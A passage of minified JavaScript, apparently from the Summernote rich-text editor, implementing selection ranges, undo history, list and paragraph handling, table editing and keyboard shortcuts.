this.sc, offset: this.so }); return e.setEndPoint("EndToEnd", Dt({ node: this.ec, offset: this.eo })), e }, Ut.prototype.getPoints = function () { return { sc: this.sc, so: this.so, ec: this.ec, eo: this.eo } }, Ut.prototype.getStartPoint = function () { return { node: this.sc, offset: this.so } }, Ut.prototype.getEndPoint = function () { return { node: this.ec, offset: this.eo } }, Ut.prototype.select = function () { var t, e = this.nativeRange(); return S.isW3CRangeSupport ? (0 < (t = document.getSelection()).rangeCount && t.removeAllRanges(), t.addRange(e)) : e.select(), this }, Ut.prototype.scrollIntoView = function (t) { var e = B(t).height(); return t.scrollTop + e < this.sc.offsetTop && (t.scrollTop += Math.abs(t.scrollTop + e - this.sc.offsetTop)), this }, Ut.prototype.normalize = function () { function t(t, e) { if (wt.isVisiblePoint(t) && (!wt.isEdgePoint(t) || wt.isRightEdgePoint(t) && !e || wt.isLeftEdgePoint(t) && e || wt.isRightEdgePoint(t) && e && wt.isVoid(t.node.nextSibling) || wt.isLeftEdgePoint(t) && !e && wt.isVoid(t.node.previousSibling) || wt.isBlock(t.node) && wt.isEmpty(t.node))) return t; var n = wt.ancestor(t.node, wt.isBlock); if ((wt.isLeftEdgePointOf(t, n) || wt.isVoid(wt.prevPoint(t).node)) && !e || (wt.isRightEdgePointOf(t, n) || wt.isVoid(wt.nextPoint(t).node)) && e) { if (wt.isVisiblePoint(t)) return t; e = !e } return (e ? wt.nextPointUntil(wt.nextPoint(t), wt.isVisiblePoint) : wt.prevPointUntil(wt.prevPoint(t), wt.isVisiblePoint)) || t } var e = t(this.getEndPoint(), !1), n = this.isCollapsed() ? e : t(this.getStartPoint(), !0); return new Ut(n.node, n.offset, e.node, e.offset) }, Ut.prototype.nodes = function (n, t) { n = n || D.ok; var i = t && t.includeAncestor, o = t && t.fullyContains, e = this.getStartPoint(), a = this.getEndPoint(), s = [], r = []; return wt.walkPoint(e, a, function (t) { var e; wt.isEditable(t.node) || (o ? (wt.isLeftEdgePoint(t) && r.push(t.node), wt.isRightEdgePoint(t) && T.contains(r, t.node) && (e = t.node)) : e = i ? wt.ancestor(t.node, n) : t.node, e && n(e) && s.push(e)) }, !0), T.unique(s) }, Ut.prototype.commonAncestor = function () { return wt.commonAncestor(this.sc, this.ec) }, Ut.prototype.expand = function (t) { var e = wt.ancestor(this.sc, t), n = wt.ancestor(this.ec, t); if (!e && !n) return new Ut(this.sc, this.so, this.ec, this.eo); var i = this.getPoints(); return e && (i.sc = e, i.so = 0), n && (i.ec = n, i.eo = wt.nodeLength(n)), new Ut(i.sc, i.so, i.ec, i.eo) }, Ut.prototype.collapse = function (t) { return t ? new Ut(this.sc, this.so, this.sc, this.so) : new Ut(this.ec, this.eo, this.ec, this.eo) }, Ut.prototype.splitText = function () { var t = this.sc === this.ec, e = this.getPoints(); return wt.isText(this.ec) && !wt.isEdgePoint(this.getEndPoint()) && this.ec.splitText(this.eo), wt.isText(this.sc) && !wt.isEdgePoint(this.getStartPoint()) && (e.sc = this.sc.splitText(this.so), e.so = 0, t && (e.ec = e.sc, e.eo = this.eo - this.so)), new Ut(e.sc, e.so, e.ec, e.eo) }, Ut.prototype.deleteContents = function () { if (this.isCollapsed()) return this; var t = this.splitText(), e = t.nodes(null, { fullyContains: !0 }), i = wt.prevPointUntil(t.getStartPoint(), function (t) { return !T.contains(e, t.node) }), o = []; return B.each(e, function (t, e) { var n = e.parentNode; i.node !== n && 1 === wt.nodeLength(n) && o.push(n), wt.remove(e, !1) }), B.each(o, function (t, e) { wt.remove(e, !1) }), new Ut(i.node, i.offset, i.node, i.offset).normalize() }, Ut.prototype.makeIsOn = function (e) { return function () { var t = wt.ancestor(this.sc, e); return !!t && t === wt.ancestor(this.ec, e) } }, Ut.prototype.isLeftEdgeOf = function (t) { if (!wt.isLeftEdgePoint(this.getStartPoint())) return !1; var e = wt.ancestor(this.sc, t); return e && wt.isLeftEdgeOf(this.sc, e) }, Ut.prototype.isCollapsed = function () { return this.sc === this.ec && this.so === this.eo }, Ut.prototype.wrapBodyInlineWithPara = function () { if (wt.isBodyContainer(this.sc) && wt.isEmpty(this.sc)) return this.sc.innerHTML = wt.emptyPara, new Ut(this.sc.firstChild, 0, this.sc.firstChild, 0); var t, e, n = this.normalize(); if (wt.isParaInline(this.sc) || wt.isPara(this.sc)) return n; wt.isInline(n.sc) ? (t = wt.listAncestor(n.sc, D.not(wt.isInline)), e = T.last(t), wt.isInline(e) || (e = t[t.length - 2] || n.sc.childNodes[n.so])) : e = n.sc.childNodes[0 < n.so ? n.so - 1 : 0]; var i, o = wt.listPrev(e, wt.isParaInline).reverse(); return (o = o.concat(wt.listNext(e.nextSibling, wt.isParaInline))).length && (i = wt.wrap(T.head(o), "p"), wt.appendChildNodes(i, T.tail(o))), this.normalize() }, Ut.prototype.insertNode = function (t) { var e = this.wrapBodyInlineWithPara().deleteContents(), n = wt.splitPoint(e.getStartPoint(), wt.isInline(t)); return n.rightNode ? n.rightNode.parentNode.insertBefore(t, n.rightNode) : n.container.appendChild(t), t }, Ut.prototype.pasteHTML = function (t) { var e = B("<div></div>").html(t)[0], n = T.from(e.childNodes), i = this.wrapBodyInlineWithPara().deleteContents(); return 0 < i.so && (n = n.reverse()), n = n.map(function (t) { return i.insertNode(t) }), 0 < i.so && (n = n.reverse()), n }, Ut.prototype.toString = function () { var t = this.nativeRange(); return S.isW3CRangeSupport ? t.toString() : t.text }, Ut.prototype.getWordRange = function (t) { var e = this.getEndPoint(); if (!wt.isCharPoint(e)) return this; var n = wt.prevPointUntil(e, function (t) { return !wt.isCharPoint(t) }); return t && (e = wt.nextPointUntil(e, function (t) { return !wt.isCharPoint(t) })), new Ut(n.node, n.offset, e.node, e.offset) }, Ut.prototype.bookmark = function (t) { return { s: { path: wt.makeOffsetPath(t, this.sc), offset: this.so }, e: { path: wt.makeOffsetPath(t, this.ec), offset: this.eo } } }, Ut.prototype.paraBookmark = function (t) { return { s: { path: T.tail(wt.makeOffsetPath(T.head(t), this.sc)), offset: this.so }, e: { path: T.tail(wt.makeOffsetPath(T.last(t), this.ec)), offset: this.eo } } }, Ut.prototype.getClientRects = function () { return this.nativeRange().getClientRects() }, Ut); function Ut(t, e, n, i) { this.sc = t, this.so = e, this.ec = n, this.eo = i, this.isOnEditable = this.makeIsOn(wt.isEditable), this.isOnList = this.makeIsOn(wt.isList), this.isOnAnchor = this.makeIsOn(wt.isAnchor), this.isOnCell = this.makeIsOn(wt.isCell), this.isOnData = this.makeIsOn(wt.isData) } var Wt = { create: function (t, e, n, i) { if (4 === arguments.length) return new Zt(t, e, n, i); if (2 === arguments.length) return new Zt(n = t, i = e, n, i); var o = this.createFromSelection(); return o || 1 !== arguments.length ? o : (o = this.createFromNode(t)).collapse(wt.emptyPara === t.innerHTML) }, createFromSelection: function () { if (S.isW3CRangeSupport) { var t = document.getSelection(); if (!t || 0 === t.rangeCount) return null; if (wt.isBody(t.anchorNode)) return null; var e = t.getRangeAt(0), n = e.startContainer, i = e.startOffset, o = e.endContainer, a = e.endOffset } else { var s = document.selection.createRange(), r = s.duplicate(); r.collapse(!1); var g = s; g.collapse(!0); var l = kt(g, !0), c = kt(r, !1); wt.isText(l.node) && wt.isLeftEdgePoint(l) && wt.isTextNode(c.node) && wt.isRightEdgePoint(c) && c.node.nextSibling === l.node && (l = c), n = l.cont, i = l.offset, o = c.cont, a = c.offset } return new Zt(n, i, o, a) }, createFromNode: function (t) { var e = t, n = 0, i = t, o = wt.nodeLength(i); return wt.isVoid(e) && (n = wt.listPrev(e).length - 1, e = e.parentNode), wt.isBR(i) ? (o = wt.listPrev(i).length - 1, i = i.parentNode) : wt.isVoid(i) && (o = wt.listPrev(i).length, i = i.parentNode), this.create(e, n, i, o) }, createFromNodeBefore: function (t) { return this.createFromNode(t).collapse(!0) }, createFromNodeAfter: function (t) { return this.createFromNode(t).collapse() }, createFromBookmark: function (t, e) { var n = wt.fromOffsetPath(t, e.s.path), i = e.s.offset, o = wt.fromOffsetPath(t, e.e.path), a = e.e.offset; return new Zt(n, i, o, a) }, createFromParaBookmark: function (t, e) { var n = t.s.offset, i = t.e.offset, o = wt.fromOffsetPath(T.head(e), t.s.path), a = wt.fromOffsetPath(T.last(e), t.e.path); return new Zt(o, n, a, i) } }, Nt = { BACKSPACE: 8, TAB: 9, ENTER: 13, SPACE: 32, DELETE: 46, LEFT: 37, UP: 38, RIGHT: 39, DOWN: 40, NUM0: 48, NUM1: 49, NUM2: 50, NUM3: 51, NUM4: 52, NUM5: 53, NUM6: 54, NUM7: 55, NUM8: 56, B: 66, E: 69, I: 73, J: 74, K: 75, L: 76, R: 82, S: 83, U: 85, V: 86, Y: 89, Z: 90, SLASH: 191, LEFTBRACKET: 219, BACKSLASH: 220, RIGHTBRACKET: 221 }, Tt = { isEdit: function (t) { return T.contains([Nt.BACKSPACE, Nt.TAB, Nt.ENTER, Nt.SPACE, Nt.DELETE], t) }, isMove: function (t) { return T.contains([Nt.LEFT, Nt.UP, Nt.RIGHT, Nt.DOWN], t) }, nameFromCode: D.invertObject(Nt), code: Nt }; var Ht = (Et.prototype.makeSnapshot = function () { var t = Wt.create(this.editable); return { contents: this.$editable.html(), bookmark: t && t.isOnEditable() ? t.bookmark(this.editable) : { s: { path: [], offset: 0 }, e: { path: [], offset: 0 } } } }, Et.prototype.applySnapshot = function (t) { null !== t.contents && this.$editable.html(t.contents), null !== t.bookmark && Wt.createFromBookmark(this.editable, t.bookmark).select() }, Et.prototype.rewind = function () { this.$editable.html() !== this.stack[this.stackOffset].contents && this.recordUndo(), this.stackOffset = 0, this.applySnapshot(this.stack[this.stackOffset]) }, Et.prototype.commit = function () { this.stack = [], this.stackOffset = -1, this.recordUndo() }, Et.prototype.reset = function () { this.stack = [], this.stackOffset = -1, this.$editable.html(""), this.recordUndo() }, Et.prototype.undo = function () { this.$editable.html() !== this.stack[this.stackOffset].contents && this.recordUndo(), 0 < this.stackOffset && (this.stackOffset--, this.applySnapshot(this.stack[this.stackOffset])) }, Et.prototype.redo = function () { this.stack.length - 1 > this.stackOffset && (this.stackOffset++, this.applySnapshot(this.stack[this.stackOffset])) }, Et.prototype.recordUndo = function () { this.stackOffset++, this.stack.length > this.stackOffset && (this.stack = this.stack.slice(0, this.stackOffset)), this.stack.push(this.makeSnapshot()) }, Et); function Et(t) { this.stack = [], this.stackOffset = -1, this.$editable = t, this.editable = t[0] } var Rt = (Yt.prototype.jQueryCSS = function (n, t) { if (S.jqueryVersion < 1.9) { var i = {}; return B.each(t, function (t, e) { i[e] = n.css(e) }), i } return n.css(t) }, Yt.prototype.fromNode = function (t) { var e = this.jQueryCSS(t, ["font-family", "font-size", "text-align", "list-style-type", "line-height"]) || {}; return e["font-size"] = parseInt(e["font-size"], 10), e }, Yt.prototype.stylePara = function (t, n) { B.each(t.nodes(wt.isPara, { includeAncestor: !0 }), function (t, e) { B(e).css(n) }) }, Yt.prototype.styleNodes = function (t, e) { t = t.splitText(); var n = e && e.nodeName || "SPAN", i = !(!e || !e.expandClosestSibling), o = !(!e || !e.onlyPartialContains); if (t.isCollapsed()) return [t.insertNode(wt.create(n))]; var a, s = wt.makePredByNodeName(n), r = t.nodes(wt.isText, { fullyContains: !0 }).map(function (t) { return wt.singleChildAncestor(t, s) || wt.wrap(t, n) }); return i ? (o && (a = t.nodes(), s = D.and(s, function (t) { return T.contains(a, t) })), r.map(function (t) { var e = wt.withClosestSiblings(t, s), n = T.head(e), i = T.tail(e); return B.each(i, function (t, e) { wt.appendChildNodes(n, e.childNodes), wt.remove(e) }), T.head(e) })) : r }, Yt.prototype.current = function (t) { var e, n = B(wt.isElement(t.sc) ? t.sc : t.sc.parentNode), i = this.fromNode(n); try { i = B.extend(i, { "font-bold": document.queryCommandState("bold") ? "bold" : "normal", "font-italic": document.queryCommandState("italic") ? "italic" : "normal", "font-underline": document.queryCommandState("underline") ? "underline" : "normal", "font-subscript": document.queryCommandState("subscript") ? "subscript" : "normal", "font-superscript": document.queryCommandState("superscript") ? "superscript" : "normal", "font-strikethrough": document.queryCommandState("strikethrough") ? "strikethrough" : "normal", "font-family": document.queryCommandValue("fontname") || i["font-family"] }) } catch (t) { } t.isOnList() ? (e = -1 < ["circle", "disc", "disc-leading-zero", "square"].indexOf(i["list-style-type"]), i["list-style"] = e ? "unordered" : "ordered") : i["list-style"] = "none"; var o, a = wt.ancestor(t.sc, wt.isPara); return a && a.style["line-height"] ? i["line-height"] = a.style.lineHeight : (o = parseInt(i["line-height"], 10) / parseInt(i["font-size"], 10), i["line-height"] = o.toFixed(1)), i.anchor = t.isOnAnchor() && wt.ancestor(t.sc, wt.isAnchor), i.ancestors = wt.listAncestor(t.sc, wt.isEditable), i.range = t, i }, Yt); function Yt() { } var Ot = (_t.prototype.insertOrderedList = function (t) { this.toggleList("OL", t) }, _t.prototype.insertUnorderedList = function (t) { this.toggleList("UL", t) }, _t.prototype.indent = function (t) { var o = this, e = Wt.create(t).wrapBodyInlineWithPara(), n = e.nodes(wt.isPara, { includeAncestor: !0 }), i = T.clusterBy(n, D.peq2("parentNode")); B.each(i, function (t, e) { var n, i = T.head(e); wt.isLi(i) ? (n = o.findList(i.previousSibling)) ? e.map(function (t) { return n.appendChild(t) }) : (o.wrapList(e, i.parentNode.nodeName), e.map(function (t) { return t.parentNode }).map(function (t) { return o.appendToPrevious(t) })) : B.each(e, function (t, e) { B(e).css("marginLeft", function (t, e) { return (parseInt(e, 10) || 0) + 25 }) }) }), e.select() }, _t.prototype.outdent = function (t) { var i = this, e = Wt.create(t).wrapBodyInlineWithPara(), n = e.nodes(wt.isPara, { includeAncestor: !0 }), o = T.clusterBy(n, D.peq2("parentNode")); B.each(o, function (t, e) { var n = T.head(e); wt.isLi(n) ? i.releaseList([e]) : B.each(e, function (t, e) { B(e).css("marginLeft", function (t, e) { return 25 < (e = parseInt(e, 10) || 0) ? e - 25 : "" }) }) }), e.select() }, _t.prototype.toggleList = function (n, t) { var i, e, o = this, a = Wt.create(t).wrapBodyInlineWithPara(), s = a.nodes(wt.isPara, { includeAncestor: !0 }), r = a.paraBookmark(s), g = T.clusterBy(s, D.peq2("parentNode")); T.find(s, wt.isPurePara) ? (i = [], B.each(g, function (t, e) { i = i.concat(o.wrapList(e, n)) }), s = i) : (e = a.nodes(wt.isList, { includeAncestor: !0 }).filter(function (t) { return !B.nodeName(t, n) })).length ? B.each(e, function (t, e) { wt.replace(e, n) }) : s = this.releaseList(g, !0), Wt.createFromParaBookmark(r, s).select() }, _t.prototype.wrapList = function (t, e) { var n = T.head(t), i = T.last(t), o = wt.isList(n.previousSibling) && n.previousSibling, a = wt.isList(i.nextSibling) && i.nextSibling, s = o || wt.insertAfter(wt.create(e || "UL"), i); return t = t.map(function (t) { return wt.isPurePara(t) ? wt.replace(t, "LI") : t }), wt.appendChildNodes(s, t), a && (wt.appendChildNodes(s, T.from(a.childNodes)), wt.remove(a)), t }, _t.prototype.releaseList = function (t, l) { var c = this, I = []; return B.each(t, function (t, e) { var n, i, o, a = T.head(e), s = T.last(e), r = l ? wt.lastAncestor(a, wt.isList) : a.parentNode, g = r.parentNode; "LI" === r.parentNode.nodeName ? (e.map(function (t) { var e = c.findNextSiblings(t); g.nextSibling ? g.parentNode.insertBefore(t, g.nextSibling) : g.parentNode.appendChild(t), e.length && (c.wrapList(e, r.nodeName), t.appendChild(e[0].parentNode)) }), 0 === r.children.length && g.removeChild(r), 0 === g.childNodes.length && g.parentNode.removeChild(g)) : (n = 1 < r.childNodes.length ? wt.splitTree(r, { node: s.parentNode, offset: wt.position(s) + 1 }, { isSkipPaddingBlankHTML: !0 }) : null, i = wt.splitTree(r, { node: a.parentNode, offset: wt.position(a) }, { isSkipPaddingBlankHTML: !0 }), e = l ? wt.listDescendant(i, wt.isLi) : T.from(i.childNodes).filter(wt.isLi), !l && wt.isList(r.parentNode) || (e = e.map(function (t) { return wt.replace(t, "P") })), B.each(T.from(e).reverse(), function (t, e) { wt.insertAfter(e, r) }), o = T.compact([r, i, n]), B.each(o, function (t, e) { var n = [e].concat(wt.listDescendant(e, wt.isList)); B.each(n.reverse(), function (t, e) { wt.nodeLength(e) || wt.remove(e, !0) }) })), I = I.concat(e) }), I }, _t.prototype.appendToPrevious = function (t) { return t.previousSibling ? wt.appendChildNodes(t.previousSibling, [t]) : this.wrapList([t], "LI") }, _t.prototype.findList = function (t) { return t ? T.find(t.children, function (t) { return -1 < ["OL", "UL"].indexOf(t.nodeName) }) : null }, _t.prototype.findNextSiblings = function (t) { for (var e = []; t.nextSibling;)e.push(t.nextSibling), t = t.nextSibling; return e }, _t); function _t() { } var Vt = (Lt.prototype.insertTab = function (t, e) { var n = wt.createText(new Array(e + 1).join(wt.NBSP_CHAR)); (t = t.deleteContents()).insertNode(n, !0), (t = Wt.create(n, e)).select() }, Lt.prototype.insertParagraph = function (t, e) { e = (e = (e = e || Wt.create(t)).deleteContents()).wrapBodyInlineWithPara(); var n = wt.ancestor(e.sc, wt.isPara); if (n) { if (wt.isEmpty(n) && wt.isLi(n)) return void this.bullet.toggleList(n.parentNode.nodeName); var i, o, a = null; 1 === this.options.blockquoteBreakingLevel ? a = wt.ancestor(n, wt.isBlockquote) : 2 === this.options.blockquoteBreakingLevel && (a = wt.lastAncestor(n, wt.isBlockquote)), a ? (r = B(wt.emptyPara)[0], wt.isRightEdgePoint(e.getStartPoint()) && wt.isBR(e.sc.nextSibling) && B(e.sc.nextSibling).remove(), (i = wt.splitTree(a, e.getStartPoint(), { isDiscardEmptySplits: !0 })) ? i.parentNode.insertBefore(r, i) : wt.insertAfter(r, a)) : (r = wt.splitTree(n, e.getStartPoint()), o = (o = wt.listDescendant(n, wt.isEmptyAnchor)).concat(wt.listDescendant(r, wt.isEmptyAnchor)), B.each(o, function (t, e) { wt.remove(e) }), (wt.isHeading(r) || wt.isPre(r) || wt.isCustomStyleTag(r)) && wt.isEmpty(r) && (r = wt.replace(r, "p"))) } else { var s = e.sc.childNodes[e.so], r = B(wt.emptyPara)[0]; s ? e.sc.insertBefore(r, s) : e.sc.appendChild(r) } Wt.create(r, 0).normalize().select().scrollIntoView(t) }, Lt); function Lt(t) { this.bullet = new Ot, this.options = t.options } var Mt = function (t, u, h, o) { var d = { colPos: 0, rowPos: 0 }, C = [], A = []; function p(t, e, n, i, o, a, s) { var r = { baseRow: n, baseCell: i, isRowSpan: o, isColSpan: a, isVirtual: s }; C[t] || (C[t] = []), C[t][e] = r } function m(t, e) { if (!C[t]) return e; if (!C[t][e]) return e; for (var n = e; C[t][n];)if (n++, !C[t][n]) return n } function f(t, e, n, i) { t === d.rowPos && d.colPos >= n.cellIndex && n.cellIndex <= e && !i && d.colPos++ } function e() { for (var t = o.rows, e = 0; e < t.length; e++)for (var n = t[e].cells, i = 0; i < n.length; i++)!function (t, e) { var n = m(t.rowIndex, e.cellIndex), i = 1 < e.colSpan, o = 1 < e.rowSpan, a = t.rowIndex === d.rowPos && e.cellIndex === d.colPos; p(t.rowIndex, n, t, e, o, i, !1); var s = e.attributes.rowSpan ? parseInt(e.attributes.rowSpan.value, 10) : 0; if (1 < s) for (var r = 1; r < s; r++) { var g = t.rowIndex + r; f(g, n, e, a), p(g, n, t, e, !0, i, !0) } var l = e.attributes.colSpan ? parseInt(e.attributes.colSpan.value, 10) : 0; if (1 < l) for (var c = 1; c < l; c++) { var I = m(t.rowIndex, n + c); f(t.rowIndex, I, e, a), p(t.rowIndex, I, t, e, o, !0, !0) } }(t[e], n[i]) } this.getActionList = function () { for (var t, e, n, i = u === Mt.where.Row ? d.rowPos : -1, o = u === Mt.where.Column ? d.colPos : -1, a = 0, s = !0; s;) { var r = 0 <= i ? i : a, g = 0 <= o ? o : a, l = C[r]; if (!l) return s = !1, A; var c = l[g]; if (!c) return s = !1, A; var I = Mt.resultAction.Ignore; switch (h) { case Mt.requestAction.Add: I = function (t) { switch (u) { case Mt.where.Column: if (t.isColSpan) return Mt.resultAction.SumSpanCount; if (t.isRowSpan && t.isVirtual) return Mt.resultAction.Ignore; break; case Mt.where.Row: if (t.isRowSpan) return Mt.resultAction.SumSpanCount; if (t.isColSpan && t.isVirtual) return Mt.resultAction.Ignore }return Mt.resultAction.AddCell }(c); break; case Mt.requestAction.Delete: I = function (t) { switch (u) { case Mt.where.Column: if (t.isColSpan) return Mt.resultAction.SubtractSpanCount; break; case Mt.where.Row: if (!t.isVirtual && t.isRowSpan) return Mt.resultAction.AddCell; if (t.isRowSpan) return Mt.resultAction.SubtractSpanCount }return Mt.resultAction.RemoveCell }(c) }A.push((t = I, e = r, n = g, { baseCell: c.baseCell, action: t, virtualTable: { rowIndex: e, cellIndex: n } })), a++ } return A }, t && t.tagName && ("td" === t.tagName.toLowerCase() || "th" === t.tagName.toLowerCase()) ? (d.colPos = t.cellIndex, t.parentElement && t.parentElement.tagName && "tr" === t.parentElement.tagName.toLowerCase() ? d.rowPos = t.parentElement.rowIndex : console.error("Impossible to identify start Row point.", t)) : console.error("Impossible to identify start Cell point.", t), e() }; Mt.where = { Row: 0, Column: 1 }, Mt.requestAction = { Add: 0, Delete: 1 }, Mt.resultAction = { Ignore: 0, SubtractSpanCount: 1, RemoveCell: 2, AddCell: 3, SumSpanCount: 4 }; var zt = (Pt.prototype.tab = function (t, e) { var n = wt.ancestor(t.commonAncestor(), wt.isCell), i = wt.ancestor(n, wt.isTable), o = wt.listDescendant(i, wt.isCell), a = T[e ? "prev" : "next"](o, n); a && Wt.create(a, 0).select() }, Pt.prototype.addRow = function (t, e) { for (var n = wt.ancestor(t.commonAncestor(), wt.isCell), i = B(n).closest("tr"), o = this.recoverAttributes(i), a = B("<tr" + o + "></tr>"), s = new Mt(n, Mt.where.Row, Mt.requestAction.Add, B(i).closest("table")[0]).getActionList(), r = 0; r < s.length; r++) { var g = s[r], l = this.recoverAttributes(g.baseCell); switch (g.action) { case Mt.resultAction.AddCell: a.append("<td" + l + ">" + wt.blank + "</td>"); break; case Mt.resultAction.SumSpanCount: if ("top" === e && (g.baseCell.parent ? g.baseCell.closest("tr").rowIndex : 0) <= i[0].rowIndex) { var c = B("<div></div>").append(B("<td" + l + ">" + wt.blank + "</td>").removeAttr("rowspan")).html(); a.append(c); break } var I = parseInt(g.baseCell.rowSpan, 10); I++, g.baseCell.setAttribute("rowSpan", I) } } if ("top" === e) i.before(a); else { if (1 < n.rowSpan) { var u = i[0].rowIndex + (n.rowSpan - 2); return void B(B(i).parent().find("tr")[u]).after(B(a)) } i.after(a) } }, Pt.prototype.addCol = function (t, e) { var n = wt.ancestor(t.commonAncestor(), wt.isCell), i = B(n).closest("tr"); B(i).siblings().push(i); for (var o = new Mt(n, Mt.where.Column, Mt.requestAction.Add, B(i).closest("table")[0]).getActionList(), a = 0; a < o.length; a++) { var s, r = o[a], g = this.recoverAttributes(r.baseCell); switch (r.action) { case Mt.resultAction.AddCell: "right" === e ? B(r.baseCell).after("<td" + g + ">" + wt.blank + "</td>") : B(r.baseCell).before("<td" + g + ">" + wt.blank + "</td>"); break; case Mt.resultAction.SumSpanCount: "right" === e ? (s = parseInt(r.baseCell.colSpan, 10), s++, r.baseCell.setAttribute("colSpan", s)) : B(r.baseCell).before("<td" + g + ">" + wt.blank + "</td>") } } }, Pt.prototype.recoverAttributes = function (t) { var e = ""; if (!t) return e; for (var n = t.attributes || [], i = 0; i < n.length; i++)"id" !== n[i].name.toLowerCase() && n[i].specified && (e += " " + n[i].name + "='" + n[i].value + "'"); return e }, Pt.prototype.deleteRow = function (t) { for (var e = wt.ancestor(t.commonAncestor(), wt.isCell), n = B(e).closest("tr"), i = n.children("td, th").index(B(e)), o = n[0].rowIndex, a = new Mt(e, Mt.where.Row, Mt.requestAction.Delete, B(n).closest("table")[0]).getActionList(), s = 0; s < a.length; s++)if (a[s]) { var r = a[s].baseCell, g = a[s].virtualTable, l = r.rowSpan && 1 < r.rowSpan, c = l ? parseInt(r.rowSpan, 10) : 0; switch (a[s].action) { case Mt.resultAction.Ignore: continue; case Mt.resultAction.AddCell: var I = n.next("tr")[0]; if (!I) continue; var u = n[0].cells[i]; l && (2 < c ? (c--, I.insertBefore(u, I.cells[i]), I.cells[i].setAttribute("rowSpan", c), I.cells[i].innerHTML = "") : 2 === c && (I.insertBefore(u, I.cells[i]), I.cells[i].removeAttribute("rowSpan"), I.cells[i].innerHTML = "")); continue; case Mt.resultAction.SubtractSpanCount: l && (2 < c ? (c--, r.setAttribute("rowSpan", c), g.rowIndex !== o && r.cellIndex === i && (r.innerHTML = "")) : 2 === c && (r.removeAttribute("rowSpan"), g.rowIndex !== o && r.cellIndex === i && (r.innerHTML = ""))); continue; case Mt.resultAction.RemoveCell: continue } } n.remove() }, Pt.prototype.deleteCol = function (t) { for (var e = wt.ancestor(t.commonAncestor(), wt.isCell), n = B(e).closest("tr"), i = n.children("td, th").index(B(e)), o = new Mt(e, Mt.where.Column, Mt.requestAction.Delete, B(n).closest("table")[0]).getActionList(), a = 0; a < o.length; a++)if (o[a]) switch (o[a].action) { case Mt.resultAction.Ignore: continue; case Mt.resultAction.SubtractSpanCount: var s, r = o[a].baseCell; r.colSpan && 1 < r.colSpan && (2 < (s = r.colSpan ? parseInt(r.colSpan, 10) : 0) ? (s--, r.setAttribute("colSpan", s), r.cellIndex === i && (r.innerHTML = "")) : 2 === s && (r.removeAttribute("colSpan"), r.cellIndex === i && (r.innerHTML = ""))); continue; case Mt.resultAction.RemoveCell: wt.remove(o[a].baseCell, !0); continue } }, Pt.prototype.createTable = function (t, e, n) { for (var i, o = [], a = 0; a < t; a++)o.push("<td>" + wt.blank + "</td>"); i = o.join(""); for (var s, r = [], g = 0; g < e; g++)r.push("<tr>" + i + "</tr>"); s = r.join(""); var l = B("<table>" + s + "</table>"); return n && n.tableClassName && l.addClass(n.tableClassName), l[0] }, Pt.prototype.deleteTable = function (t) { var e = wt.ancestor(t.commonAncestor(), wt.isCell); B(e).closest("table").remove() }, Pt); function Pt() { } var Kt = (Jt.prototype.initialize = function () { var e = this; this.$editable.on("keydown", function (t) { if (t.keyCode === Tt.code.ENTER && e.context.triggerEvent("enter", t), e.context.triggerEvent("keydown", t), t.isDefaultPrevented() || (e.options.shortcuts ? e.handleKeyMap(t) : e.preventDefaultEditableShortCuts(t)), e.isLimited(1, t)) return !1 }).on("keyup", function (t) { e.setLastRange(), e.context.triggerEvent("keyup", t) }).on("focus", function (t) { e.setLastRange(), e.context.triggerEvent("focus", t) }).on("blur", function (t) { e.context.triggerEvent("blur", t) }).on("mousedown", function (t) { e.context.triggerEvent("mousedown", t) }).on("mouseup", function (t) { e.setLastRange(), e.context.triggerEvent("mouseup", t) }).on("scroll", function (t) { e.context.triggerEvent("scroll", t) }).on("paste", function (t) { e.setLastRange(), e.context.triggerEvent("paste", t) }), this.$editable.attr("spellcheck", this.options.spellCheck), this.$editable.html(wt.html(this.$note) || wt.emptyPara), this.$editable.on(S.inputEventName, D.debounce(function () { e.context.triggerEvent("change", e.$editable.html(), e.$editable) }, 10)), this.$editor.on("focusin", function (t) { e.context.triggerEvent("focusin", t) }).on("focusout", function (t) { e.context.triggerEvent("focusout", t) }), this.options.airMode || (this.options.width && this.$editor.outerWidth(this.options.width), this.options.height && this.$editable.outerHeight(this.options.height), this.options.maxHeight && this.$editable.css("max-height", this.options.maxHeight), this.options.minHeight && this.$editable.css("min-height", this.options.minHeight)), this.history.recordUndo(), this.setLastRange() }, Jt.prototype.destroy = function () { this.$editable.off() }, Jt.prototype.handleKeyMap = function (t) { var e = this.options.keyMap[S.isMac ? "mac" : "pc"], n = []; t.metaKey && n.push("CMD"), t.ctrlKey && !t.altKey && n.push("CTRL"), t.shiftKey && n.push("SHIFT"); var i = Tt.nameFromCode[t.keyCode]; i && n.push(i); var o = e[n.join("+")]; o ? !1 !== this.context.invoke(o) && t.preventDefault() : Tt.isEdit(t.keyCode) && this.afterCommand() }, Jt.prototype.preventDefaultEditableShortCuts = function (t) { (t.ctrlKey || t.metaKey) && T.contains([66, 73, 85], t.keyCode) && t.preventDefault() }, Jt.prototype.isLimited = function (t, e) { return t = t || 0, (void 0 === e || !(Tt.isMove(e.keyCode) || e.ctrlKey || e.metaKey || T.contains([Tt.code.BACKSPACE, Tt.code.DELETE], e.keyCode))) && 0 < this.options.maxTextLength && this.$editable.text().length + t >= this.options.maxTextLength }, Jt.prototype.createRange = function () { return this.focus(), this.setLastRange(), this.getLastRange() }, Jt.prototype.setLastRange = function () { this.lastRange = Wt.create(this.editable) }, Jt.prototype.getLastRange = function () { return this.lastRange || this.setLastRange(), this.lastRange }, Jt.prototype.saveRange = function (t) { t && this.getLastRange().collapse().select() }, Jt.prototype.restoreRange = function () { this.lastRange && (this.lastRange.select(), this.focus()) }, Jt.prototype.saveTarget = function (t) { this.$editable.data("target", t) }, Jt.prototype.clearTarget = function () { this.$editable.removeData("target") }, Jt.prototype.restoreTarget = function () { return this.$editable.data("target") }, Jt.prototype.currentStyle = function () { var t = Wt.create(); return (t = t && t.normalize()) ? this.style.current(t) : this.style.fromNode(this.$editable) }, Jt.prototype.styleFromNode = function (t) { return this.style.fromNode(t) }, Jt.prototype.undo = function () { this.context.triggerEvent("before.command", this.$editable.html()), this.history.undo(), this.context.triggerEvent("change", this.$editable.html(), this.$editable) }, Jt.prototype.commit = function () { this.context.triggerEvent("before.command", this.$editable.html()), this.history.commit(), this.context.triggerEvent("change", this.$editable.html(), this.$editable) }, Jt.prototype.redo = function () { this.context.triggerEvent("before.command", this.$editable.html()), this.history.redo(), this.context.triggerEvent("change", this.$editable.html(), this.$editable) }, Jt.prototype.beforeCommand = function () { this.context.triggerEvent("before.command", this.$editable.html()), this.focus() }, Jt.prototype.afterCommand = function (t) { this.normalizeContent(), this.history.recordUndo(), t 